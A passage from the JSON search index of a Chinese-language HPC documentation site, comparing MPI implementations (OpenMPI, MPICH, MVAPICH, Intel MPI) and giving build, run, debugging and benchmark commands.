coll_tuned_use_dynamic_rules 1 \\\n--mca coll_tuned_bcast_algorithm $algo \\\n</code></pre>"},{"location":"optimization/HPN/mpi/","title":"MPI","text":""},{"location":"optimization/HPN/mpi/#mpi","title":"MPI","text":"<p>Note</p> <ul> <li>\u4f7f\u7528\u5bb9\u5668\u8fd0\u884c MPI \u7a0b\u5e8f\uff0c\u89c1 Apptainer\u3002</li> </ul> <p>OpenMPI \u548c MPICH \u662f\u6700\u4e3b\u8981\u7684 MPI \u5b9e\u73b0\uff0c\u540e\u8005\u884d\u751f\u7248\u672c\u4f17\u591a\u3002\u4e0b\u8868\u5bf9\u6bd4\u4e86\u5e38\u89c1\u7684 MPI \u5b9e\u73b0\u3002</p> \u5bf9\u6bd4\u9879 OpenMPI MVAPICH Intel MPI MPICH HPC-X Platform MPI Spectrum MPI \u5386\u53f2 History of Open MPI2003\u7531 OSU\u3001LANL\u3001UTK \u7684 MPI \u5b9e\u73b0\u5408\u5e76\u800c\u6765 overview of the mvapich project2002OSU \u5f00\u53d1\uff0c\u884d\u751f\u81ea MPICH \uff08\u6765\u81ea Wikipedia\uff09\u884d\u751f\u81ea MPICH MPICH Overview2001\u7531 ANL \u548c MSU \u5f00\u53d1 []\u6253\u5305\u81ea OpenMPI IBM \u95ed\u6e90 IBM \u95ed\u6e90 \u6587\u6863 Open MPI main documentation MVAPICH :: UserGuide Intel\u00ae MPI Library Documentation Guides \\ MPICH mpirun \u6307\u5411 <code>prun</code>(v5.x)<code>orterun</code>(v4.x) <code>mpiexec.hydra</code><code>mpiexec.mpirun_rsh</code>\uff08\u63a8\u8350\uff09 <code>mpiexec.hydra</code> hydra\uff08\u9ed8\u8ba4\uff09gforker\uff08\u7f16\u8bd1\u9009\u9879\uff09 Host \u9009\u9879 <code>-H/--host node1:1,node1:1&lt;br&gt;--hostfile hf</code> <code>-np 2 node1 node2&lt;br&gt;-hostfile hf</code> <code>-hosts node1:1,node2:1&lt;br&gt;-f/-hostfile/-machine/-machinefile hf</code> <code>-f hf</code> Hostfile \u683c\u5f0f <code>node1 slots=n</code> <code>node1:n:hca1</code> <code>node1:n</code> <code>node1:n</code> \u4f8b\u7a0b/\u6d4b\u8bd5 examples/ OSU Benchmark Intel MPI Benchmark exmaples/<code>make testing</code> OSU BenchmarkIMBexamples mpitool \u4fe1\u606f <code>ompi_info --all</code> <code>mpiname -a</code> <code>impi_info</code> <code>mpiexec -info</code> \u73af\u5883\u53d8\u91cf <code>--mca mca_base_env_list VAR1,VAR2,...</code><code>OMPI_*</code> \u81ea\u52a8\u5bfc\u51fa<code>-x</code> \u5df2\u5f03\u7528 <code>-export</code> \u4e0d\u8986\u76d6<code>-export-all</code> \u5168\u8986\u76d6 \uff08\u6a21\u677f\uff09 <code>|</code> <code>|</code> <code>|</code> `` <p>MPI \u95f4\u7684 ABI \u517c\u5bb9\u6027\u4fe1\u606f\u89c1\uff1a</p> <ul> <li>MPICH ABI Compatibility Initiative | MPICH\uff1aMPICH\u3001Intel MPI\u3001MVAPICH2</li> <li> <p>Hammond MPI ABI for MUG 2023</p> <p>\u4f3c\u4e4e\u5728 2023 \u540e\uff0cMPICH \u548c OpenMPI \u5bb6\u65cf\u5f00\u59cb\u7740\u624b\u7edf\u4e00 ABI \u4e86\u3002</p> </li> </ul>"},{"location":"optimization/HPN/mpi/#openmpi","title":"OpenMPI","text":"<p>Quote</p> <ul> <li>EasyBuild Tech Talks \u00b7 easybuilders/easybuild Wiki\uff1a2020 \u5e74\u7684\u8bb2\u5ea7\uff0c\u5bf9 OpenMPI \u8fdb\u884c\u4e86\u5168\u9762\u7684\u8bb2\u89e3\u3002</li> <li>Open MPI head of development \u2014 Open MPI main documentation</li> <li>open-mpi/ompi: Open MPI main development repository</li> </ul>"},{"location":"optimization/HPN/mpi/#\u57fa\u7840\u6982\u5ff5","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>\u6211\u4eec\u4ece 2020 \u5e74\u7684 The ABCs of Open MPI \u7cfb\u5217\u8bb2\u5ea7\u5f00\u59cb\u3002</p> <p>OpenMPI \u662f\u4e00\u4e2a\u5927\u578b\u9879\u76ee\uff0c\u91c7\u7528\u6a21\u5757\u5316\u7ec4\u7ec7\uff0c\u79f0\u4e3a MCA\uff08Modular Component Architecture\uff09\uff0c\u4ece\u4e0a\u81f3\u4e0b\u5206\u4e3a Project\u3001Framework\u3001Component\uff1a</p> <p></p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709 component \u88ab\u7f16\u8bd1\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\uff08Dynamic Shared Objects, DSO\uff09\uff0c\u53ef\u4ee5\u6309\u9700\u52a0\u8f7d\uff1a</p> <p></p> <p>\u5230 OpenMPI v5.0\uff0c\u5171\u6709\u5982\u4e0b FrameWork</p> <ul> <li> <p>MPI\uff1a</p> <ul> <li> <p><code>coll</code>\uff1aMPI Collecitves\uff0c\u5b9e\u73b0 <code>MPI_BCAST</code>\u3001<code>MPI_BARRIER</code>\u3001<code>MPI_REDUCE</code> \u7b49\u96c6\u5408\u901a\u4fe1\u3002</p> <p>\u5728 v4.1.0 \u540e\uff0c\u589e\u52a0\u4e86\u53ef\u9009\u7684\u7ec4\u4ef6\uff0c\u5e76\u4e14\u53ef\u4ee5\u5bf9\u9ed8\u8ba4\u7684\u901a\u4fe1\u7b97\u6cd5\u9009\u62e9\u8fdb\u884c\u8c03\u4f18\u3002</p> </li> <li> <p><code>op</code>\uff1aMPI Reduction Operations</p> </li> <li><code>osc</code>\uff1aMPI One-sided Communications</li> <li> <p><code>pml</code>\uff1aMPI Point-to-Point Communications\uff0c\u5b9e\u73b0 <code>MPI_SEND</code>\u3001<code>MPI_RECV</code> \u7b49\u70b9\u5bf9\u70b9\u901a\u4fe1\u3002\u53ef\u9009\uff1a</p> <ul> <li> <p><code>ob1</code>\uff1a\u591a\u8bbe\u5907\u591a\u94fe\u8def\u5f15\u64ce\u3002\u5b83\u53ef\u4ee5\u9009\u62e9\u591a\u4e2a\u80fd\u591f\u5230\u8fbe\u76ee\u6807\u7684 BTL \u7ec4\u4ef6\uff0c\u5e76\u5b9e\u73b0\u8d1f\u8f7d\u5747\u8861\u3002</p> <p></p> </li> <li> <p><code>cm</code>\uff1a\u7528\u4e8e\u9a71\u52a8\u652f\u6301\u786c\u4ef6\u6d88\u606f\u6807\u7b7e\u5339\u914d\u7684\u7f51\u7edc\u63a5\u53e3\uff08matching network\uff09\uff0c\u6bd4\u5982 iWARP\u3001OminiPath</p> <p></p> </li> <li> <p><code>ucx</code>\uff1a\u4f7f\u7528 UCX \u901a\u4fe1\u5e93\uff0c\u7528\u4e8e InfiniBand \u6216 RoCE \u8bbe\u5907</p> </li> </ul> </li> <li> <p><code>topo</code>\uff1aMPI Topologies</p> </li> </ul> </li> <li> <p>\u5e95\u5c42\u4f20\u8f93\uff1a</p> <ul> <li> <p><code>btl</code>\uff1aByte Transport Layer</p> <p>\u53ef\u9009\u7ec4\u4ef6\uff1a</p> <ul> <li><code>ofi</code>\uff1aLibfabric</li> <li><code>self</code>\uff1aloopback</li> <li><code>sm</code>\uff1a\u5171\u4eab\u5185\u5b58</li> <li><code>tcp</code></li> </ul> <p>\u5176\u4f59\u4e0d\u5e38\u89c1\u7684\u7565\u8fc7\u3002</p> </li> <li> <p><code>bml</code>\uff1aBTL Multipliexing Layer</p> </li> <li><code>mtl</code>\uff1aMatching Transport Layer\uff0c\u4e0d\u5e38\u7528\uff0c\u7565</li> </ul> </li> <li> <p>\u6587\u4ef6\uff1a</p> <ul> <li> <p><code>io</code>\uff1aMPI IO\uff0c\u5b9e\u73b0 <code>MPI_FILE_OPEN</code>\u3001<code>MPI_FILE_READ</code>\u3001<code>MPI_FILE_WRITE</code> \u7b49\u6587\u4ef6\u64cd\u4f5c\u3002\u53ef\u9009\uff1a</p> <ul> <li><code>ompio</code>\uff1a\u9ed8\u8ba4</li> <li><code>romio</code>\uff1a\u6765\u81ea MPICH</li> </ul> </li> <li> <p><code>fbtl</code>\uff1aMPI File Byte Transfer Layer</p> </li> <li><code>fcoll</code>\uff1aMPI File Collectives</li> <li><code>fs</code>\uff1aMPI File Management</li> <li><code>sharedfp</code>\uff1aMPI shared file pointer operations</li> </ul> </li> <li> <p>\u5176\u4ed6\uff1a</p> <ul> <li><code>hook</code>\uff1aGeneric Hooks</li> <li><code>vprotocol</code>\uff1aVirtual Protocol API Interposition</li> </ul> </li> </ul>"},{"location":"optimization/HPN/mpi/#\u901a\u4fe1\u5e93","title":"\u901a\u4fe1\u5e93","text":"<p>\u901a\u4fe1\u5e93\u4e3b\u8981\u901a\u8fc7 PML \u9009\u62e9\u3002\u4e00\u822c\u4f1a\u91c7\u7528\u5982\u4e0b\u7ec4\u5408\uff1a</p> <pre><code>--mca pml ucx\n--mca pml_ucx_verbose 100\n--mca osc_ucx_verbose 100\n-x UCX_NET_DEVICES=\n-x UCX_LOG_LEVEL=trace\n</code></pre> <pre><code>--mca pml ob1 \\\n--mca btl ofi\n</code></pre> <p>IB \u548c RoCE \u8bbe\u5907\u652f\u6301\uff1a</p> <ul> <li> <p><code>openib</code> \u5728 OpenMPI 5.1.x \u540e\u5f03\u7528\u3002\u4e0e\u4e4b\u76f8\u5173\u7684\u53d8\u91cf\u6709\uff1a</p> <pre><code>OMPI_MCA_btl_openib_if_include\n</code></pre> </li> <li> <p><code>ucx</code>\uff1aIB \u548c RoCE \u8bbe\u5907\u7684\u9996\u9009\u6a21\u5757\uff0c\u76f8\u5173\u53d8\u91cf\u6709\uff1a</p> <pre><code>UCX_NET_DEVICES\n</code></pre> </li> </ul>"},{"location":"optimization/HPN/mpi/#pmix","title":"PMIx","text":"<p>PMIx\uff08Process Management Interface\uff09\uff1a\u7528\u4e8e\u4e0e <code>slurm</code> \u8fd9\u6837\u7684\u8d44\u6e90\u7ba1\u7406\u5668\uff08Resource Manager\uff0cRM\uff09\u6c9f\u901a\u3002\u56e0\u4e3a PMI \u7684\u5b58\u5728\uff0c\u6211\u4eec\u80fd\u591f\u76f4\u63a5\u4f7f\u7528 <code>srun</code> \u8fd0\u884c OpenMPI \u7a0b\u5e8f\uff0c\u53d6\u5f97\u4e0e <code>mpirun</code> \u7b49\u6548\u7684\u6548\u679c\u3002</p> <p>MPI \u4e0e\u8d44\u6e90\u7ba1\u7406\u5668\u53ef\u4ee5\u901a\u8fc7\u4e09\u79cd\u65b9\u5f0f\u4ea4\u4e92\uff1a</p> <ul> <li>Slurm \u542f\u52a8 MPI \u5e76\u884c\u7a0b\u5e8f\uff0c\u5e76\u901a\u8fc7 PMI API\uff08Process Management Interface\uff09\u8c03\u7528\u6267\u884c\u521d\u59cb\u5316\u3002</li> <li>Slurm \u5206\u914d\u8d44\u6e90\uff0c\u7136\u540e\u7531 <code>mpirun</code> \u57fa\u4e8e Slurm \u7684\u57fa\u7840\u8bbe\u65bd\u542f\u52a8\u5e76\u884c\u7a0b\u5e8f\u3002<code>srun</code> \u5c31\u662f\u8fd9\u79cd\u65b9\u5f0f\u3002</li> <li>Slurm \u5206\u914d\u8d44\u6e90\uff0c\u7136\u540e\u7531 <code>mpirun</code> \u901a\u8fc7 SSH \u7b49\u5176\u4ed6\u673a\u5236\u542f\u52a8\u5e76\u884c\u7a0b\u5e8f\u3002\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0cSlurm \u65e0\u6cd5\u8fdb\u884c\u8d44\u6e90\u7ba1\u63a7\u548c\u8ffd\u8e2a\u3002</li> </ul> <p>\u53ef\u4ee5\u9605\u8bfb Slurm: PMIx - Exascale Process Management Interface \u4e86\u89e3\u66f4\u591a\u3002</p>"},{"location":"optimization/HPN/mpi/#orte-\u4e0e-prrte","title":"ORTE \u4e0e PRRTE","text":"<p>ORTE \u5c31\u662f</p> <p><code>orterun</code>\u3001<code>mpirun</code>\u3001<code>mpiexec</code> \u662f\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u89c1 Ubuntu Manpage: orterun, mpirun, mpiexec - Execute serial and parallel jobs in Open MPI.</p> <p>\u5982\u679c\u8981\u9605\u8bfb ORTE \u6e90\u7801\uff0c\u53ef\u4ee5\u5728 v4.x \u4e0b\u627e\u5230 <code>orte</code> \u6587\u4ef6\u5939\uff0c\u5176\u4e2d <code>orte/tools/orterun/main.c</code> \u5c31\u662f orterun \u7684\u5165\u53e3\u3002</p> <p>\u5728 OpenMPI v5.0 \u4e2d\uff0cPRRTE \u53d6\u4ee3\u4e86 ORTE\u3002\u73b0\u5728\uff0c<code>prun</code> \u7684\u5165\u53e3\u5728 <code>prrte/src/tools/prun/main.c</code>\u3002</p>"},{"location":"optimization/HPN/mpi/#\u6784\u5efa\u548c\u8fd0\u884c","title":"\u6784\u5efa\u548c\u8fd0\u884c","text":"<p>\u6784\u5efa\uff1a</p> <pre><code>./configure CC= CXX= FC= --with-FOO --without-FOO\n</code></pre> <p>OpenMPI \u5185\u7f6e\u4e86\u67d0\u4e9b\u4f9d\u8d56\uff08\u5982 hwloc \u548c libevent\uff09\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u7528 <code>--with-hwloc</code> \u7b49\u9009\u9879\u66ff\u6362\u4e3a\u5916\u90e8\u7248\u672c\u3002</p> <p>\u8981\u6784\u5efa\u652f\u6301 CUDA \u7684 OpenMPI\uff0c\u9700\u8981\uff1a</p> <ul> <li>\u6784\u5efa\u652f\u6301 GDR \u7684 UCX</li> <li>\u7136\u540e\u6784\u5efa\u652f\u6301 CUDA \u548c UCX \u7684 OpenMPI</li> </ul> <p>\u67e5\u770b\u5f53\u524d\u6784\u5efa\u7684\u4fe1\u606f\uff1a</p> <pre><code>ompi_info --parsable\n</code></pre> <p>\u8fd0\u884c\uff1a</p> <pre><code>export OMPI_MCA_foo=bar\nmpirun \\\n    --mca pml ob1/cm/ucx \\\n    --mca btl a,b,c \\\n</code></pre> <ul> <li>OpenMPI \u4f7f\u7528 Slot \u4f5c\u4e3a\u8d44\u6e90\u5206\u914d\u5355\u4f4d\uff0c\u6709\u591a\u5c11\u4e2a Slot \u5c31\u53ef\u4ee5\u8fd0\u884c\u591a\u5c11\u4e2a\u8fdb\u7a0b\u3002<ul> <li>\u9ed8\u8ba4\uff1a\u5904\u7406\u5668\u6838\u6570\u3002</li> <li>\u4f7f\u7528\u8d85\u7ebf\u7a0b\u6838\u5fc3\u6570\uff1a\u7528 <code>--use-hwthread-cpus</code> \u5f00\u542f\uff0c\u5e38\u89c1\u4e3a 2 \u500d\u5904\u7406\u5668\u6838\u6570\u3002\u53ef\u4ee5\u5728 <code>lscpu</code> \u4e2d\u7684 <code>Thread(s) per core</code> \u67e5\u770b\u3002</li> <li>\u8d44\u6e90\u7ba1\u7406\u5668\u8c03\u5ea6\uff1a\u4ece\u8d44\u6e90\u7ba1\u7406\u5668\u83b7\u53d6 Slot \u6570\u3002</li> <li>\u9700\u8981\u6ce8\u610f\uff1aSlot \u6570\u548c\u786c\u4ef6\u6ca1\u6709\u5173\u7cfb\uff0c\u53ef\u80fd\u6bd4\u786c\u4ef6\u6838\u6570\u591a\uff0c\u4e5f\u53ef\u80fd\u6bd4\u786c\u4ef6\u6838\u6570\u5c11\u3002</li> </ul> </li> </ul> <p>Example</p> <p>\u5728 OpenMPI v4.x \u4e2d\uff1a</p> <pre><code>$ ompi_info --all | grep btl_openib_if_include\nMCA btl openib: parameter \"btl_openib_if_include\" (current value: \"\", data source: default, level: 9 dev/all, type: string)\n    Comma-delimited list of devices/ports to be used (e.g. \"mthca0,mthca1:2\"; empty value means to use all ports found).  Mutually exclusive with btl_openib_if_exclude.\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f\uff1a</p> <pre><code>export OMPI_MCA_btl_openib_if_include=mlx5_0:1\nmpirun \\\n    --mca btl_openib_if_include mlx5_0:1\n</code></pre> <p>\u8c03\u8bd5\u9009\u9879\uff1a</p> <pre><code>--mca mpi_show_mca_params all \\\n--mca pml_base_verbose 100\n</code></pre>"},{"location":"optimization/HPN/mpi/#\u6e90\u7801\u9605\u8bfb","title":"\u6e90\u7801\u9605\u8bfb","text":""},{"location":"optimization/HPN/mpi/#\u6784\u5efa\u7cfb\u7edf","title":"\u6784\u5efa\u7cfb\u7edf","text":"<p>\u4ece Makefile \u5f00\u59cb\uff0c\u6784\u5efa\u65f6\u6211\u4eec\u4f7f\u7528 <code>all</code> \u8fd9\u4e2a\u76ee\u6807\uff0c\u5b83\u8fdb\u5165\u5230\u6240\u6709\u5b50\u6587\u4ef6\u5939\u5e76\u6267\u884c\u6784\u5efa\uff0c\u89c1 Where is the target all-recursive in makefile? - Stack Overflow\u3002</p>"},{"location":"optimization/HPN/mpi/#\u8fd0\u884c\u65f6","title":"\u8fd0\u884c\u65f6","text":""},{"location":"optimization/HPN/mpi/#mca","title":"MCA","text":""},{"location":"optimization/HPN/mpi/#btl","title":"BTL","text":""},{"location":"optimization/HPN/mpi/#openib","title":"openib","text":""},{"location":"optimization/HPN/mpi/#mpich","title":"MPICH","text":"<p>MPICH \u662f MVAPICH\u3001Intel MPI \u7b49\u4f17\u591a MPI \u5b9e\u73b0\u7684\u57fa\u7840\u3002MPICH \u7ef4\u62a4\u56db\u4e2a\u7ec4\u4ef6\uff1a</p> <ul> <li>mpich</li> <li>hydra\uff1a\u542f\u52a8\u5668\uff0c\u884d\u751f\u7248\u672c\u5927\u591a\u4e5f\u652f\u6301 hydra \u542f\u52a8</li> <li>libpmi</li> <li>mpich-testsuite</li> </ul> <p>\u7b80\u5355\u68b3\u7406\uff1a</p> <ul> <li>Process Manager\uff08PM\uff09\uff1a\u9ed8\u8ba4 hydra\u3002\u7f16\u8bd1\u65f6\u53ef\u9009 gforker\uff0c\u4ec5\u5728\u5355\u8282\u70b9\u4e0a\u901a\u8fc7 fork \u548c exec \u521b\u5efa\u8fdb\u7a0b\u3002</li> <li>Communication Device\uff1aMPICH \u4e2d\u7684\u901a\u4fe1\u5206\u4e3a device \u548c module \u5c42\u3002<ul> <li><code>ch3</code> \u610f\u601d\u662f 3rd version of Channel interface\u3002\u901a\u8fc7\u7f16\u8bd1\u65f6 <code>--with-device=ch3:channel:module</code> \u53ef\u9009\u7ec4\u4ef6\u3002<code>nemesis</code> \u662f\u9ed8\u8ba4 channel\uff0c\u5355\u8282\u70b9\u7528 shared-memory\uff0c\u8de8\u8282\u70b9\u7528 socket\u3002</li> <li>\u9ed8\u8ba4\uff1a<code>ch4</code>\uff0c\u652f\u6301\u7684 module \u6709 ofi\u3001UCX\u3001POSIX \u5171\u4eab\u5185\u5b58\u3002</li> </ul> </li> </ul>"},{"location":"optimization/HPN/mpi/#\u6784\u5efa\u548c\u8fd0\u884c_1","title":"\u6784\u5efa\u548c\u8fd0\u884c","text":"<pre><code>./configure \\\n    --enable-g=all \\\n    --enable-debuginfo \\\n</code></pre>"},{"location":"optimization/HPN/mpi/#hydra","title":"Hydra","text":"<pre><code>-verbose \\\n-print-all-exitcodes \\\n-prepend-rank \\\n-profile \\\n</code></pre>"},{"location":"optimization/HPN/mpi/#mvapich","title":"MVAPICH","text":"<p>Quote</p> <ul> <li>The MVAPICH2 Project Latest Status and Future Plans\uff1a\u5728 SC 21 \u8fdb\u884c\u7684\u4e00\u6b21\u62a5\u544a\uff0c\u4ecb\u7ecd\u4e86 MVAPICH2 \u7684\u6700\u65b0\u8fdb\u5c55\u548c\u672a\u6765\u8ba1\u5212\u3002</li> </ul> <p>\u8fd9\u53ef\u80fd\u662f\u76ee\u524d\u6700\u5148\u8fdb\u7684 MPI \u5b9e\u73b0\uff0c\u53d7 NVIDIA \u559c\u7231\uff0c\u5e76\u4e14\u4e5f\u662f\u795e\u5a01 - \u592a\u6e56\u4e4b\u5149\u6240\u4f7f\u7528\u7684 MPI \u5b9e\u73b0\u3002</p> <p>MVAPICH \u63d0\u4f9b\u975e\u5e38\u591a\u79cd\u7ec6\u5206\u7684\u7248\u672c\uff0c\u53ef\u6839\u636e\u9700\u6c42\u9009\u62e9\u3002\u4e00\u822c\u9009\u7528 MVAPICH2\uff08\u6e90\u7801\u5206\u53d1\uff09\u6216 MVAPICH2-X\uff08\u6253\u5305\u5206\u53d1\uff09\uff0c\u63d0\u4f9b\u6700\u5168\u9762\u7684 MPI \u548c IB/RoCE \u652f\u6301\u3002</p> <p>\u7528\u6237\u624b\u518c\u89c1 MVAPICH \u9996\u9875 Support-&gt;UserGuide\u3002</p> <p>\u4ee5 MVAPICH2 \u4e3a\u4f8b\u68b3\u7406\uff1a</p> <ul> <li>\u901a\u4fe1\uff1a\u57fa\u4e8e MPICH \u7684 CH3 \u6539\u9020\uff0c\u901a\u8fc7 OpenFabric \u652f\u6301\u4e86\u591a\u79cd RDMA \u901a\u4fe1\uff0c\u4f8b\u5982 OFA-IB-CH3\u3001OFA-RoCE-CH3 \u7b49\u3002</li> </ul>"},{"location":"optimization/HPN/mpi/#\u6784\u5efa\u548c\u8fd0\u884c_2","title":"\u6784\u5efa\u548c\u8fd0\u884c","text":"<p>\u65e5\u5fd7\u8f93\u51fa\u9700\u8981\u5728\u6784\u5efa\u65f6\u5f00\u542f\uff1a</p> <pre><code>./configure --enable-g=all --enable-error-messages=all \\\n    --enable-debuginfo\n</code></pre> <pre><code>mpirun_rsh \\\n    MV2_HOMOGENEOUS_CLUSTER=1 \\\n    MV2_SHOW_ENV_INFO=2 \\\n    MV2_DEBUG_FORK_VERBOSE=2 \\\n    MV2_DEBUG_CORESIZE=unlimited \\\n    MV2_DEBUG_FT_VERBOSE=1 \\\n    MV2_DEBUG_SHOW_BACKTRACE=1 \\\n    MV2_DEBUG_MEM_USAGE_VERBOSE=2 \\\n    MV2_USE_RoCE=1 MV2_DEFAULT_GID_INDEX=3 MV2_USE_RDMA_CM=0 \\\n    build/default/libexec/osu-micro-benchmarks/mpi/pt2pt/osu_bw\n</code></pre> <p>\u7f51\u7edc\u63a5\u53e3\u9009\u62e9\uff1a</p> <pre><code># RoCE\nMV2USERoCE=1 MV2USERDMACM=1\n# IB\nMV2_IBA=HCA=mlx4_0:mlx4_1\n</code></pre>"},{"location":"optimization/HPN/mpi/#osu-benchmark","title":"OSU Benchmark","text":"<p>Quote</p> <ul> <li>Benchmarks - MVAPICH</li> </ul>"},{"location":"optimization/HPN/mpi/#intel-mpi","title":"Intel MPI","text":"<p>Quote</p> <ul> <li>Intel MPI Library</li> <li>Get Started</li> <li>Developer Guides</li> <li>Developer References</li> <li>How to set up IntelMPI over RoCEv2 - HPC-Works - Confluence</li> <li>Intel\u00ae MPI Library 2019 Over Libfabric*</li> <li>Improve Performance and Stability with Intel\u00ae MPI Library on InfiniBand*</li> </ul> <pre><code>./intel-mpi*.sh -a --silent --cli --eula accept\n</code></pre>"},{"location":"optimization/HPN/mpi/#\u8fd0\u884c\u4e0e\u8c03\u8bd5","title":"\u8fd0\u884c\u4e0e\u8c03\u8bd5","text":"<p>\u52a0\u8f7d\u73af\u5883\uff1a</p> <ul> <li> <p>oneAPI\uff1a</p> <pre><code>source /opt/intel/oneapi/setvars.sh\n</code></pre> </li> <li> <p>IntelMPI\uff08\u8001\u7248\u672c\uff09\uff1a\u5177\u4f53\u8def\u5f84\u53ef\u80fd\u6709\u53d8\u5316\uff0c\u4ec5\u4f5c\u53c2\u8003</p> <pre><code>source intel2018/compilers_and_libraries_2018.3.222/linux/mpi/bin64/mpivars.sh\n</code></pre> </li> </ul> <p>\u5bf9 Intel MPI \u6765\u8bf4\uff0c<code>mpirun</code> \u662f <code>mpiexec.hydra</code> \u7684\u5305\u88c5\u3002\u5176\u9009\u9879\u6709\u5168\u5c40\u9009\u9879\u548c\u5c40\u90e8\u9009\u9879\u4e4b\u5206\uff0c\u4e00\u822c\u4ee5 <code>g</code> \u5f00\u5934\u7684\u53c2\u6570\u662f\u5168\u5c40\u9009\u9879\uff0c\u4e0b\u6587\u4e0d\u5bf9\u5168\u5c40\u548c\u5c40\u90e8\u9009\u9879\u5206\u522b\u4ecb\u7ecd\u3002\u53ef\u4ee5\u7f16\u5199\u6587\u4ef6\u4fdd\u5b58\u9009\u9879\uff0c\u4f7f\u7528 <code>-configfile</code> \u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\uff0c<code>#</code> \u6ce8\u91ca\u3002<code>./mpiexec.conf</code> \u4f1a\u81ea\u52a8\u52a0\u8f7d\u3002</p> <ul> <li>\u73af\u5883\u53d8\u91cf<ul> <li><code>-genv &lt;ENVVAR&gt; &lt;val&gt;</code> \u6307\u5b9a\u8fd0\u884c\u65f6\u73af\u5883\u53d8\u91cf\uff0c\u5e38\u7528\u7684\u6709\uff1a<code>OMP_</code></li> <li><code>-genvall, -genvnone</code> \u63a7\u5236\u662f\u5426\u4f20\u9012\u73af\u5883\u53d8\u91cf</li> </ul> </li> <li>profiling:<ul> <li><code>-trace</code> <code>-aps</code> <code>-mps</code></li> </ul> </li> <li>\u8bbe\u5907\uff1a<ul> <li><code>-iface</code></li> </ul> </li> <li>\u8fd0\u884c\u53c2\u6570\uff1a<ul> <li><code>-n, -np</code> \u8fdb\u7a0b\u6570</li> <li><code>-env</code> \u73af\u5883\u53d8\u91cf</li> <li><code>-path</code> \u53ef\u6267\u884c\u6587\u4ef6</li> </ul> </li> </ul> <p>\u91cd\u8981\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>-genv I_MPI_DEBUG 5 \\\n</code></pre> <p>!!! tips <code>I_MPI_OFI_PROVIDER</code> \u4f18\u5148\u4e8e <code>FI_PROVIDER</code>\u3002</p> <p>\u66f4\u591a\u9009\u9879\u53c2\u9605 Intel\u00ae MPI Library Developer Reference for Linux* OS \u4e2d\u7684 Command Reference \u548c Environment Variable Reference \u7ae0\u8282\u3002</p> <p>\u65e5\u5fd7\u8f93\u51fa\uff1a</p> <pre><code>mpirun \\\n    -genv I_MPI_DEBUG 5 \\\n    -genv I_MPI_HYDRA_DEBUG \\\n    -v \\\n</code></pre> <p>\u8c03\u8bd5\uff1a</p> <p>\u8c03\u8bd5\u5668\u4f3c\u4e4e\u4e0d\u80fd\u548c\u65e5\u5fd7\u4e00\u8d77\u7528\uff0c\u5426\u5219\u8c03\u8bd5\u5668\u547d\u4ee4\u8f93\u5165\u4f1a\u6709\u95ee\u9898\u3002</p> <ul> <li> <p>oneAPI\uff1a</p> <pre><code>mpirun -n 4 -gtool \"gdb-oneapi:0-3=attach\" ./wrf_hydro.exe\n# Using 'z' command you can switch active processes.\n# e.g.\n# 0-3: (gdb) z 1-3\n# 1-3: (gdb) b 53\n# 1-3: Breakpoint 2 at 0x4009f3: file test.c, line 53.\n# 1-3: (gdb) z\n# 0-3: (gdb) r\n# 0-3: Continuing.\n</code></pre> </li> <li> <p>Intel MPI:</p> <pre><code>mpirun \\\n    -gdb \\\n</code></pre> </li> </ul>"},{"location":"optimization/HPN/mpi/#imb-benchmark","title":"IMB Benchmark","text":"<p>Quote</p> <ul> <li>Intel MPI Benchmarks User Guide</li> <li> intel/mpi-benchmarks</li> </ul> <p>Intel\u00ae MPI Benchmarks \u5305\u542b\u4ee5\u4e0b\u7ec4\u4ef6\uff1a</p> <ul> <li>IMB-MPI1 \u2013 \u7528\u4e8e MPI-1 \u529f\u80fd\u7684\u57fa\u51c6\u6d4b\u8bd5\u3002</li> <li>\u7528\u4e8e MPI-2 \u529f\u80fd\u7684\u7ec4\u4ef6\uff1a<ul> <li>IMB-EXT \u2013 \u5355\u8fb9\u901a\u4fe1\u57fa\u51c6\u6d4b\u8bd5\u3002</li> <li>IMB-IO \u2013 \u8f93\u5165/\u8f93\u51fa\u57fa\u51c6\u6d4b\u8bd5\u3002</li> </ul> </li> <li>\u7528\u4e8e MPI-3 \u529f\u80fd\u7684\u7ec4\u4ef6\uff1a<ul> <li>IMB-NBC \u2013 \u975e\u963b\u585e\u96c6\u5408\uff08non-blocking collective\uff0cNBC\uff09 \u64cd\u4f5c\u7684\u57fa\u51c6\u6d4b\u8bd5\u3002</li> <li>IMB-RMA \u2013 \u5355\u8fb9\u901a\u4fe1\u57fa\u51c6\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u57fa\u51c6\u6d4b\u8bd5\u6d4b\u91cf MPI-3 \u6807\u51c6\u4e2d\u5f15\u5165\u7684\u8fdc\u7a0b\u5185\u5b58\u8bbf\u95ee\uff08Remote Memory Access\uff0cRMA\uff09 \u529f\u80fd\u3002</li> <li>IMB-MT \u2013 \u5728\u6bcf\u4e2a rank \u5185\u8fd0\u884c\u7684\u591a\u7ebf\u7a0b \u7684 MPI-1 \u529f\u80fd\u57fa\u51c6\u6d4b\u8bd5\u3002</li> </ul> </li> </ul> <p>\u4f7f\u7528\u65b9\u6cd5\u89c1\uff1a</p> <ul> <li>Intel(R) MPI Benchmarks User Guide</li> <li>Command-line Control</li> </ul> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50</p> <pre><code>mpirun -ppn 1 -f hostfile IMB-MPI1 &gt; MPI1.log\n</code></pre> <p>\u8981\u83b7\u53d6\u66f4\u591a\u8c03\u8bd5\u4fe1\u606f\uff0c\u8bf7\u5728\u8fd0\u884c\u524d\u8bbe\u7f6e <code>I_MPI_DEBUG</code>\uff08\u53ef\u4ee5\u8bbe\u7f6e\u4e3a <code>0</code> \u5230 <code>5</code>\uff09\u3002</p> <pre><code>I_MPI_DEBUG=1 mpirun -ppn 1 -f hostfile IMB-MPI1 &gt; MPI1.log\n</code></pre> <p>\u4e0b\u9762\u7684\u547d\u4ee4\u884c\u5728\u57fa\u51c6\u6d4b\u8bd5\u5217\u8868 <code>IMB-MPI1</code> \u4e2d\u53ea\u6267\u884c <code>PingPong</code> 